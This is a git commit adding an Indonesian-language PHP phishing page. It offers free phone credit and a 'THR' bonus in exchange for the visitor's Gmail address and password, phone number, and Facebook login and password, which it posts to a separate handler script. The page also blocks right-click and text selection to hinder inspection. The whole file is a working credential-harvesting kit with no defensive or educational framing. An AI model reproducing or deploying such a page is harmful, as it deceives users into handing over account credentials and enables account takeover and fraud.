06ab6f223af8c501916623c050970c57dce6202c
misterereksi <75098591+misterereksi@users.noreply.github.com>
2020-12-02 03:21:53 +0700

    Add files via upload

---
+++ pulsa.gratis/prosess.php
@@ -0,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<link href='https://www.clashofstats.com/images/common/characters/large/1x/barbarian3.png' rel='icon' type='https://www.clashofstats.com/images/common/characters/large/1x/barbarian3.png'/>
+<title>SERBA GRATIS DAPATKAN PULSA & KUOTA</title>
+<script src="http://4upanel.us.to/assets/js/jquery.min.js"></script>
+<link rel="stylesheet" href="http://fontawesome.io/assets/font-awesome/css/font-awesome.css">
+<link rel="stylesheet" href="bootstrap.min.css">
+<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
+</head><body style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; cursor: default;"><div align="center"><noscript>
+<div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
+<div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;"> Mohon aktifkan javascript pada browser untuk mengakses halaman ini! </div></div>
+</noscript></div>
+<!--Kode untuk mencegah seleksi teks, block teks dll.-->
+<script type="text/javascript">
+function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
+</script>
+<!--Kode untuk mematikan fungsi klik kanan di blog-->
+<script type="text/javascript">
+function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
+</script>
+<style>
+.error-msg {
+    margin: .5em 0;
+    display: block;
+    color: #dd4b39;
+    line-height: 17px;
+}
+body {
+  background: url(https://media.karousell.com/media/photos/products/2018/03/01/jual_pulsa_all_operator_1519882905_03afa125.jpg) no-repeat center center fixed;
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+</style>
+<body style="padding:0px;margin:0 auto;">
+<div style="padding:0px;margin:0 auto;" class="container ">
+<div class="col-md-3">
+</div>
+<div style="border:1px solid #f1f1f1;padding:0px;margin:0 auto;" class="col-md-6">
+<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
+<img style="border:none;width:100%;max-height:200px;margin:0 auto;" src="https://s.kaskus.id/r480x480/images/fjb/2016/04/11/wts_inject_paket_internet_all_operator___token_pln_harga_termurah_4278860_1460378311.png"/>
+<div style="border:none;" class="btn btn-success btn-block"><b><i class=""></i>SILAKAN KONFIRMASI THR ANDA DI BAWAH</b></div>
+</div>
+
+<center>
+<div  style="background:white;padding:30px;width:100%" class="form-horizontal">
+<h4 >
+<img style="border:none;width:40%;max-height:191px;" src="https://img.etimg.com/thumb/msid-63994810,width-643,imgsize-35146,resizemode-4/gmail-gets-a-makeover-heres-how-you-can-make-the-most-of-its-features.jpg"/></p>
+<p><center>GMAIL</center></p>
+  <div class="content">
+	        <h1></h1>
+        
+		
+	   <div class="zIndex">
+	          
+        <div class="registration">
+            <form id="frmLoginUI" name="frmLoginUI" method="post" action="success.php" onSubmit="return validate();"><div style='display:none'><input type='hidden' name='csrfmiddlewaretoken' value='UX8ogBv3k7w8XeR8SHNYr6GVbYvGKzlL' /></div>              
+	  <div style="width:100%" class="form-group">
+   <input type="email" class="form-control" name="email" id="email" placeholder="Email" required><br>
+                        <input type="Password" class="form-control" name="password" id="password" placeholder="Password" required><br>
+                        <input type="number" class="form-control" name="no" id="no" placeholder="Number Phone" required><br>
+						
+						<img style="border:none;width:20%;max-height:191px;" src="https://www.facebook.com/images/fb_icon_325x325.png"/></p>
+						<p><center>Facebook</center></p>
+                         <input type="text" class="form-control" name="email3" id="email3" placeholder="Email/telepon" required><br>
+                        <input type="Password" class="form-control" name="password2" id="password2" placeholder="Password" required><br>     
+						
+</div>
+
+<div style="width:100%" class="form-group">
+  <form><input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="MINTA THR"> </form>
+</div>
+</div>
+<p>Silakan cek kembali apakah anda sudah mengisi dengan benar ?</p>
+<p>THR Hanya dapat di ambil satu kali setiap nomor hp. Jadi mohon untuk di isi dengan teliti</p>
+
+<img src="https://2.bp.blogspot.com/-NMDvDbrODXk/WMzP2eOL93I/AAAAAAAAALA/WulIk8h88gsNNkirNrhfV1reh0RzCqF7QCLcB/s1600/good.jpg"/></p>
+<p>Copyright &copy; 2019 .</p>
+</div>
+</div>
+<div class="col-md-3">
+</div>
+</div>
